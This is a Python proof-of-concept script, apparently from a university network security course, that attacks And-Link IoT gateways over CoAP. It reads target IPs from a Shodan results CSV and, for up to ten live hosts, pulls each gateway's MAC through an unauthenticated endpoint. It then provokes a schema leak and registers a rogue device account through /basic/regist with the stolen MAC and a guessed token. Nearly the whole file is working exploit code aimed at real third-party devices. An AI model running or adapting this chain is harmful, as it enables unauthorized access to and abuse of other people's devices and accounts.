"""
ispezione_falle_critiche.py
============================
Proof of Concept: Logic Bypass e Rogue Account Creation.

Documenta la catena di vulnerabilità sull'ecosistema And-Link:
  1. Esfiltrazione MAC address via /qlink/queryGwExt (GET non autenticata)
  2. Leak dello schema JSON via /device/inform/bootstrap (Self-Documenting API)
  3. Rogue Account Creation via /basic/regist con MAC esfiltrato

La PoC si considera conclusa alla dimostrazione dell'accettazione
della richiesta da parte del backend ("result":1). Le conseguenze
operative dell'account creato non sono state verificate per vincoli etici.

Input  : risultati_massivi_shodan.csv
Autore : Camilla Vivaldi
Corso  : Network Security – Università degli Studi di Verona
Data   : 10 Maggio 2026
"""

import json
import time
import pandas as pd
from coapthon.client.helperclient import HelperClient

FILE_INPUT = "risultati_massivi_shodan.csv"
CAMPIONE   = 10
TIMEOUT    = 5
PORTA      = 5683


def get_request(ip, percorso):
    """GET non autenticata, restituisce il payload come stringa."""
    client = HelperClient(server=(ip, PORTA))
    try:
        res = client.get(percorso, timeout=TIMEOUT)
        if res and res.payload:
            return res.payload
        return None
    except Exception:
        return None
    finally:
        client.stop()


def post_request(ip, percorso, payload_dict):
    """POST con payload JSON, restituisce la risposta come stringa."""
    client = HelperClient(server=(ip, PORTA))
    try:
        res = client.post(
            percorso,
            payload=json.dumps(payload_dict),
            timeout=TIMEOUT
        )
        if res and res.payload:
            return res.payload
        return None
    except Exception:
        return None
    finally:
        client.stop()


def esfiltra_mac(ip):
    """
    Fase 1 – Information Disclosure.
    Interroga /qlink/queryGwExt e restituisce il MAC address del gateway.
    """
    print(f"    [1] GET /qlink/queryGwExt...", end=" ")
    payload = get_request(ip, "/qlink/queryGwExt")

    if not payload:
        print("nessuna risposta.")
        return None

    print(f"OK")
    print(f"       [DATA]: {payload[:150]}")

    # Estrazione MAC dal JSON
    try:
        dati = json.loads(payload)
        mac = dati.get("gatewayMac")
        if mac:
            print(f"       [MAC]:  {mac}")
            return mac
    except json.JSONDecodeError:
        pass

    return None


def leak_schema(ip):
    """
    Fase 2 – Self-Documenting API.
    POST con payload non valido su /device/inform/bootstrap:
    il firmware restituisce il codice di errore con la struttura attesa.
    """
    print(f"    [2] POST /device/inform/bootstrap (payload non valido)...", end=" ")
    risposta = post_request(ip, "/device/inform/bootstrap", {"test": 1})

    if not risposta:
        print("nessuna risposta.")
        return None

    print(f"OK")
    print(f"       [SCHEMA LEAK]: {risposta[:150]}")
    return risposta


def rogue_account(ip, mac):
    """
    Fase 3 – Rogue Account Creation.
    Costruisce il payload con il MAC esfiltrato e lo invia a /basic/regist.
    Il parametro productToken è l'unico non deterministico.
    """
    print(f"    [3] POST /basic/regist (MAC: {mac})...", end=" ")

    payload = {
        "deviceMac":       mac.replace(":", ""),   # formato senza separatori
        "productToken":    "admin123",              # unico parametro non noto
        "deviceType":      "30102",                 # dal messaggio respCode:1003
        "ipAddress":       "192.168.1.200",
        "firmwareVersion": "f1.0",
        "softwareVersion": "s1.0",
        "timestamp":       1715020000
    }

    risposta = post_request(ip, "/basic/regist", payload)

    if not risposta:
        print("nessuna risposta.")
        return

    print(f"OK")
    print(f"       [RISPOSTA]: {risposta}")

    # result:1 indica accettazione da parte del backend
    try:
        dati = json.loads(risposta)
        if dati.get("result") == 1:
            print(f"       [!!!] REGISTRAZIONE ACCETTATA dal backend.")
            print(f"             gwId: {dati.get('gwId', 'N/A')}")
    except json.JSONDecodeError:
        pass


# ── Pipeline PoC ──────────────────────────────────────────────────────────────

print("[*] Caricamento dataset...")
df = pd.read_csv(FILE_INPUT)

# Selezioniamo host And-Link con risposta 2.05 su almeno un endpoint
maschera = (
    df["Percorso"].str.contains("qlink", case=False, na=False) &
    df["Vulnerabilità Radice (Info Leak)"].str.contains("SI", case=False, na=False)
)
target = (
    df[maschera]
    .drop_duplicates(subset=["IP Target"])
    .head(CAMPIONE)
)
print(f"[*] Host selezionati per la PoC: {len(target)}\n")

for _, row in target.iterrows():
    ip = row["IP Target"]
    print(f"{'='*55}")
    print(f"[*] Target: {ip}")

    # Fase 1: esfiltrazione MAC
    mac = esfiltra_mac(ip)
    if not mac:
        print("    [!] MAC non ottenuto, skip.\n")
        continue

    # Fase 2: leak schema
    leak_schema(ip)

    # Fase 3: rogue account con MAC reale
    rogue_account(ip, mac)

    time.sleep(1)

print(f"\n[*] PoC completata.")